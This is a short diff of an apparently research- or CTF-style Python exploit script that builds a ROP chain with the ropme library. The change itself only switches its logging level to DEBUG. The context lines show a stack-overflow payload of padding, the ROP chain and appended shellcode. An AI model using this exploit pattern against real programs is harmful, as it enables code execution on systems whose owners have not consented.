@@ -54,7 +54,7 @@ if len(sys.argv) < 2: # manual mode
   )
 else:
   print "Using automatically built ROP chain"
-  rop = ropme.rop_to_shellcode([(filename, 0)], target_address, logging.CRITICAL)
+  rop = ropme.rop_to_shellcode([(filename, 0)], target_address, logging.DEBUG)
 
 payload = 'A'*512 + 'B'*8 + rop
 payload += ((1024 - len(payload)) * 'B') + shellcode
